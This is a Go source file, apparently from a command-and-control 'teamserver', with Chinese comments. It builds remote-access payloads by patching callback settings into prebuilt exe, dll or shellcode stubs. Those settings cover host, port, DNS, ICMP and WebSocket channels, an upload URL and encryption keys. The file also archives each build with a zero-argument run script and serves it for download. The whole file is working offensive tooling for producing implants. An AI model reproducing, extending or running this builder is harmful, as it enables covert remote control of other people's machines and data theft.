//
// 闭环: 校验(A层) → 注入密钥(B层) → 生成 dd_key → 取内置 stub → PatchBytes 烧块 →
// 自检(round-trip + 明文秘密扫描) → 归档(bin/spec.json/run.cmd) → 审计。
// 全程不调用 exec.Command(生成路径零工具链), 现场编译路径见 artifact.Generate(默认关闭)。
package service

import (
	"bytes"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"time"

	"cleat/teamserver/internal/artifact"
)

// PayloadSpec 一次生成请求(映射 烧录 JSON; Advanced 承载 C 层 14 域)。
type PayloadSpec struct {
	Form         string         `json:"form"`
	Name         string         `json:"name"`
	Transport    string         `json:"transport"`
	Host         string         `json:"host"`
	Port         string         `json:"port"`
	URL          string         `json:"url"`
	UploadURL    string         `json:"upload_url"`
	DNSServer    string         `json:"dns_server"`
	Domain       string         `json:"dns_domain"`
	ICMPTarget   string         `json:"icmp_target"`
	WSSURL       string         `json:"wss_url"`
	KeyMode      string         `json:"key_mode"`      // x25519(默认)|psk
	PSK          string         `json:"psk,omitempty"` // 仅 dev; 交付禁
	ServerPubkey string         `json:"server_pubkey,omitempty"`
	DDKey        string         `json:"-"`                  // 不由前端传; 服务端生成/记录
	Advanced     map[string]any `json:"advanced,omitempty"` // C 层(P1)
}

// PayloadResult 生成结果(回前端 + 归档)。
type PayloadResult struct {
	Name        string   `json:"name"`
	Form        string   `json:"form"`
	BinPath     string   `json:"bin_path"`     // 服务器绝对路径(运维)
	DownloadURL string   `json:"download_url"` // /api/payloads/<name>/download
	RunLine     string   `json:"run_line"`
	Args        []string `json:"args"`
	Warnings    []string `json:"warnings"`
	BuiltAt     string   `json:"built_at"`
}

// SetArtifact 注入产物环境(main.go 装配)。
// outRoot 为产物根(空则不注入, 调用时回落 ./artifacts); stubDir 为外部 stub 目录覆盖(空=仅内置);
// allowCompile 控制现场编译路径(默认 false)。
func (s *Service) SetArtifact(outRoot, stubDir string, allowCompile bool) error {
	reg, err := artifact.NewStubRegistry(stubDir)
	if err != nil {
		return err
	}
	s.artifactMu.Lock()
	defer s.artifactMu.Unlock()
	s.artifactOutRoot = outRoot
	s.artifactStubDir = stubDir
	s.artifactAllowCompile = allowCompile
	s.stubReg = reg
	s.gen = artifact.NewEnv(outRoot, stubDir, allowCompile)
	return nil
}

// artifactEnv 返回(注册表, 生成器), 惰性初始化(SetArtifact 未装配时的兜底)。
func (s *Service) artifactEnv() (*artifact.StubRegistry, *artifact.Generator) {
	s.artifactMu.Lock()
	defer s.artifactMu.Unlock()
	outRoot := s.artifactOutRoot
	if outRoot == "" {
		outRoot = "./artifacts"
	}
	if s.gen == nil {
		s.gen = artifact.NewEnv(outRoot, s.artifactStubDir, s.artifactAllowCompile)
	}
	if s.stubReg == nil {
		reg, err := artifact.NewStubRegistry(s.artifactStubDir)
		if err != nil {
			reg = &artifact.StubRegistry{}
		}
		s.stubReg = reg
	}
	return s.stubReg, s.gen
}

// PayloadStubs 可用 stub 列表(含陈旧提示所需 agent_commit)。
func (s *Service) PayloadStubs() []artifact.StubInfo {
	reg, _ := s.artifactEnv()
	return reg.List()
}

// GeneratePayload 老远控闭环核心: 校验 → 取 stub → 生成 dd_key → PatchBytes → 自检 → 归档。
// op=="" 表示本地 CLI(不落审计); HTTP 入口恒传用户名。
func (s *Service) GeneratePayload(op string, spec *PayloadSpec) (*PayloadResult, error) {
	if spec == nil {
		return nil, invalid("空请求")
	}
	reg, gen := s.artifactEnv()

	form := strings.TrimSpace(spec.Form)
	if form == "" {
		form = "exe"
	}
	spec.Form = form
	if strings.TrimSpace(spec.Name) == "" {
		base := strings.TrimSpace(spec.Transport)
		if base == "" {
			base = "payload"
		}
		spec.Name = fmt.Sprintf("%s-%s", base, time.Now().Format("20060102-150405"))
	}
	if !safeName(spec.Name) {
		return nil, invalid("非法产物名(仅限文件名安全字符, 不含路径分隔符)")
	}

	// 组 A/B 层 cfg(仅非空字段; 空=不写入, 交由 Agent 内置默认)。
	cfg := map[string]any{}
	putNonEmpty(cfg, "transport", spec.Transport)
	putNonEmpty(cfg, "host", spec.Host)
	putNonEmpty(cfg, "port", spec.Port)
	putNonEmpty(cfg, "url", spec.URL)
	putNonEmpty(cfg, "upload_url", spec.UploadURL)
	putNonEmpty(cfg, "dns_server", spec.DNSServer)
	putNonEmpty(cfg, "dns_domain", spec.Domain)
	putNonEmpty(cfg, "icmp_target", spec.ICMPTarget)
	putNonEmpty(cfg, "wss_url", spec.WSSURL)

	// 1. A 层条件必填校验(transport 分派)。
	if err := artifact.ValidatePatchCfg(cfg); err != nil {
		return nil, invalid(err.Error())
	}

	// 2. 密钥(B 层): x25519 未给公钥 → 注入长期密钥对公钥; psk → 必填。
	if err := s.resolvePayloadKeys(spec, gen, cfg); err != nil {
		return nil, err
	}

	dd, err := randomHex(32)
	if err != nil {
		return nil, fail("生成 dd_key 失败: " + err.Error())
	}
	spec.DDKey = dd
	cfg["recovery"] = map[string]any{"key": dd}

	// C 层 advanced(P1): 合并进 cfg(channels 整链替换语义由调用方保证)。
	for k, v := range spec.Advanced {
		if strings.TrimSpace(k) == "" {
			continue
		}
		cfg[k] = v
	}

	// 4. 取内置 stub。
	blob, _, err := reg.Get(form)
	if err != nil {
		return nil, notFound(fmt.Sprintf("stub 不存在(form=%s)", form))
	}

	// 5. 烧录(magic + 载荷上限校验在 PatchBytes 内)。
	patched, err := artifact.PatchBytes(blob, cfg)
	if err != nil {
		return nil, invalid(err.Error())
	}

	warns, err := selfCheckPayload(patched, cfg, spec)
	if err != nil {
		return nil, fail(err.Error())
	}

	// 7. 归档: bin(原子) + spec.json(0600, 含 dd_key) + run.cmd。
	dir := filepath.Join(gen.OutRoot, spec.Name)
	if err := os.MkdirAll(dir, 0o755); err != nil {
		return nil, fail("创建产物目录失败: " + err.Error())
	}
	binName := spec.Name + extForForm(form)
	binPath := filepath.Join(dir, binName)
	if err := artifact.WriteFileAtomic(binPath, patched, 0o755); err != nil {
		return nil, fail("写入产物失败: " + err.Error())
	}
	// spec.json: 0600(内含 dd_key 秘密); 内容 = spec 字段 + dd_key。
	specObj := map[string]any{}
	if bs, err := json.Marshal(spec); err == nil {
		_ = json.Unmarshal(bs, &specObj)
	}
	specObj["dd_key"] = dd
	specObj["built_at"] = time.Now().Format(time.RFC3339)
	specJS, _ := json.MarshalIndent(specObj, "", "  ")
	if err := artifact.WriteFileAtomic(filepath.Join(dir, "spec.json"), specJS, 0o600); err != nil {
		return nil, fail("写入 spec.json 失败: " + err.Error())
	}
	// run.cmd: 样本内配置已烧入配置块 → 零参数直接运行。
	run := "@echo off\r\nrem 配置已烧入样本配置块, 无需命令行参数\r\n" + binName + "\r\n"
	if err := artifact.WriteFileAtomic(filepath.Join(dir, "run.cmd"), []byte(run), 0o644); err != nil {
		return nil, fail("写入 run.cmd 失败: " + err.Error())
	}

	if op != "" {
		s.st.Audit(op, 0, "payload_generate", form, "ok")
	}
	return &PayloadResult{
		Name:        spec.Name,
		Form:        form,
		BinPath:     binPath,
		DownloadURL: "/api/payloads/" + spec.Name + "/download",
		RunLine:     binName,
		Args:        nil, // 配置已烧入配置块, 运行期零参数
		Warnings:    warns,
		BuiltAt:     time.Now().Format(time.RFC3339),
	}, nil
}

// resolvePayloadKeys 处理 B 层密钥, 并把结果写入 cfg。
func (s *Service) resolvePayloadKeys(spec *PayloadSpec, gen *artifact.Generator, cfg map[string]any) error {
	keyMode := strings.TrimSpace(spec.KeyMode)
	if keyMode == "" {
		keyMode = "x25519"
	}
	switch keyMode {
	case "x25519":
		if strings.TrimSpace(spec.ServerPubkey) == "" {
			pub, err := gen.ResolveLongTermPubkey()
			if err != nil {
				return fail("注入 server_pubkey 失败: " + err.Error())
			}
			spec.ServerPubkey = pub
		}
		cfg["server_pubkey"] = spec.ServerPubkey
	case "psk":
		if strings.TrimSpace(spec.PSK) == "" {
			return invalid("psk 模式需要 psk(64 位 hex, 与 TeamServer 一致)")
		}
		cfg["psk"] = spec.PSK
	default:
		return invalid(fmt.Sprintf("未知密钥模式 %q", keyMode))
	}
	return nil
}

//   - 明文秘密硬失败(PSK 不应以明文出现在二进制里);
//   - 配置块可解码且关键字段与输入一致(round-trip);
//   - x25519 模式公钥、recovery.key 均在块内。
func selfCheckPayload(patched []byte, cfg map[string]any, spec *PayloadSpec) ([]string, error) {
	if spec.PSK != "" && bytes.Contains(patched, []byte(spec.PSK)) {
		return nil, fmt.Errorf("产物自检失败: 二进制内含 PSK 明文(交付样本零秘密红线)")
	}
	got, err := artifact.DecodeConfigBlock(patched)
	if err != nil {
		return nil, fmt.Errorf("产物自检失败: 配置块不可解码: %w", err)
	}
	for _, k := range []string{"transport", "host", "port", "url", "upload_url", "dns_server", "dns_domain", "icmp_target", "wss_url"} {
		if v := mapStr(cfg, k); v != "" {
			if gv := mapStr(got, k); gv != v {
				return nil, fmt.Errorf("产物自检失败: 字段 %s 往返不一致(got=%q want=%q)", k, gv, v)
			}
		}
	}
	if spec.ServerPubkey != "" {
		if gv := mapStr(got, "server_pubkey"); gv != spec.ServerPubkey {
			return nil, fmt.Errorf("产物自检失败: 配置块内缺 server_pubkey")
		}
	}
	if rec, ok := got["recovery"].(map[string]any); !ok || mapStr(rec, "key") != spec.DDKey {
		return nil, fmt.Errorf("产物自检失败: 配置块内 recovery.key 缺失或与本次 dd_key 不符")
	}
	return nil, nil
}

// ListPayloads 已生成清单(扫 OutRoot)。
func (s *Service) ListPayloads() ([]artifact.PayloadEntry, error) {
	_, gen := s.artifactEnv()
	ents, err := os.ReadDir(gen.OutRoot)
	if err != nil {
		if os.IsNotExist(err) {
			return nil, nil
		}
		return nil, fail("读取产物目录失败: " + err.Error())
	}
	var out []artifact.PayloadEntry
	for _, e := range ents {
		if !e.IsDir() || e.Name() == "keys" || strings.HasPrefix(e.Name(), "_") {
			continue
		}
		name := e.Name()
		entry := artifact.PayloadEntry{Name: name, Form: "exe"}
		if data, err := os.ReadFile(filepath.Join(gen.OutRoot, name, "spec.json")); err == nil {
			var m map[string]any
			if json.Unmarshal(data, &m) == nil {
				if f := mapStr(m, "form"); f != "" {
					entry.Form = f
				}
				entry.BuiltAt = mapStr(m, "built_at")
			}
		}
		if fi, err := os.Stat(filepath.Join(gen.OutRoot, name, name+extForForm(entry.Form))); err == nil {
			entry.Size = fi.Size()
		}
		out = append(out, entry)
	}
	sort.Slice(out, func(i, j int) bool { return out[i].Name < out[j].Name })
	return out, nil
}

// PayloadFile 解析某产物的可下载文件路径 + 文件名(防目录穿越: basename 白名单)。
func (s *Service) PayloadFile(name string) (path, filename string, err error) {
	if !safeName(name) {
		return "", "", notFound("非法产物名")
	}
	_, gen := s.artifactEnv()
	dir := filepath.Join(gen.OutRoot, name)
	if fi, err := os.Stat(dir); err != nil || !fi.IsDir() {
		return "", "", notFound("产物不存在: " + name)
	}
	form := "exe"
	if data, err := os.ReadFile(filepath.Join(dir, "spec.json")); err == nil {
		var m map[string]any
		if json.Unmarshal(data, &m) == nil {
			if f := mapStr(m, "form"); f != "" {
				form = f
			}
		}
	}
	filename = name + extForForm(form)
	full := filepath.Join(dir, filename)
	if _, err := os.Stat(full); err != nil {
		return "", "", notFound("产物文件不存在: " + filename)
	}
	return full, filename, nil
}

// DeletePayload 删除产物目录。
func (s *Service) DeletePayload(op, name string) error {
	if !safeName(name) {
		return invalid("非法产物名")
	}
	_, gen := s.artifactEnv()
	dir := filepath.Join(gen.OutRoot, name)
	if fi, err := os.Stat(dir); err != nil || !fi.IsDir() {
		return notFound("产物不存在: " + name)
	}
	if err := os.RemoveAll(dir); err != nil {
		return fail("删除产物失败: " + err.Error())
	}
	if op != "" {
		s.st.Audit(op, 0, "payload_delete", name, "ok")
	}
	return nil
}

// ---- 小工具 ----

// putNonEmpty 仅写入非空字符串值。
func putNonEmpty(m map[string]any, key, val string) {
	if v := strings.TrimSpace(val); v != "" {
		m[key] = v
	}
}

// mapStr 从 map 取字符串值(容忍 string / json.Number / float64)。
func mapStr(m map[string]any, key string) string {
	switch v := m[key].(type) {
	case string:
		return v
	case json.Number:
		return v.String()
	case float64:
		return fmt.Sprintf("%v", v)
	}
	return ""
}

// randomHex 生成 n 字节随机数的 hex 串。
func randomHex(n int) (string, error) {
	b := make([]byte, n)
	if _, err := rand.Read(b); err != nil {
		return "", err
	}
	return hex.EncodeToString(b), nil
}

// safeName 校验产物名是否为安全的单段文件名(防目录穿越)。
func safeName(name string) bool {
	if name == "" || name == "." || name == ".." {
		return false
	}
	if strings.ContainsAny(name, `/\`) {
		return false
	}
	return true
}

// extForForm 按形态返回产物扩展名。
func extForForm(form string) string {
	switch form {
	case "dll":
		return ".dll"
	case "shc":
		return ".bin"
	default:
		return ".exe"
	}
}
